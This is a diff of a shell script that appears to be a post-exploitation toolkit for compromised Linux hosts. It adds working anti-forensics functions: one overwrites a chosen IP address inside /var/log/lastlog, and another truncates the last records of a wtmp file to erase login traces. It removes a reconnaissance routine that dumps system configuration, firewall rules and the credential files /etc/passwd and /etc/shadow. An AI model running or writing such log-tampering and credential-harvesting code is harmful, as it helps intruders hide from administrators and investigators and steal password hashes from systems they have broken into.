@@ -1504,6 +1504,24 @@ _warn_upx_exe() {
     echo -en "${str}"$'\033[0m'
 }
 
+lastlog_trim() {
+    [ $# -lt 1 ] && { echo -e >&2 "Replaces any pattern\nUsage: lastlog_trim 'IP' 'NEW IP' [/var/log/lastlog]"; return 255; }
+    perl -0777 -pi -e 'BEGIN{$f=shift;$r=shift;$l=length($f)>length($r)?length($f):length($r);$f.="\x00"x($l-length($f));$r.="\x00"x($l-length($r))}s/\Q$f\E/$r/g' -- "${1:?}" "${2:-""}" "${3:-/var/log/lastlog}"
+}
+
+wtmp_trim() {
+    local fn count
+    
+    fn="${1:-/var/tmp/wtmp}"
+    count="${2:-1}"
+    [ ! -f "$fn" ] && return
+    local str
+
+    str="$(head -c -$((count * 384)) "$fn" | base64 -w0 2>/dev/null)" || return
+    [ -z "$str" ] && return
+    echo "$str" | base64 -d 2>/dev/null >"$fn"
+}
+
 memdump() {
     local pid="${1:?}"
     local out x exe=$(readlink -f /proc/${pid}/exe 2>/dev/null)
@@ -2082,49 +2100,6 @@ _loot_auth_log() {
     echo -e "${CB}SSHD Logins:${CDY}${CF}"
     echo "$str"
     echo -en "${CN}"
-}
-
-lootmoremore() {
-    # Stolen from whatserver.sh:
-    set -x
-    date
-    uname -a
-    uptime
-    command -v xid >/dev/null && xid
-    hostname
-    systemctl list-unit-files --all --no-pager
-    systemctl list-units --type=service --all --no-pager
-    systemctl list-units --type=timer --all --no-pager
-    systemctl list-timers --all --no-pager
-    lsmod
-    cat /proc/cmdline
-    cat /proc/config
-    [ -f /proc/config.gz ] && gunzip < /proc/config.gz || cat /boot/config-$(uname -r)
-    cat /etc/resolv.conf
-    cat /etc/hosts
-    cat /etc/passwd
-    cat /etc/shadow
-    cat /etc/group
-    ip a sh
-    ip r show
-    ip rule show
-    command wg >/dev/null && wg show 2>/dev/null
-    ps -eF f
-    ss -lanutop4
-    ss -lanutop6
-    iptables-save
-    nft -ann list ruleset
-    sysctl -a
-    last -iwx
-    lastb -iwx
-    command -v auditctl >/dev/null && auditctl -l
-    # afick -k
-    cat /etc/afick.conf 2>/dev/null
-    cat /var/lib/afick/history 2>/dev/null
-    cat /etc/nsswitch.conf 2>/dev/null
-    cat /etc/nscd.conf 2>/dev/null
-    cat /etc/nslcd.conf 2>/dev/null
-    set +x
 }
 
 lootmore() {
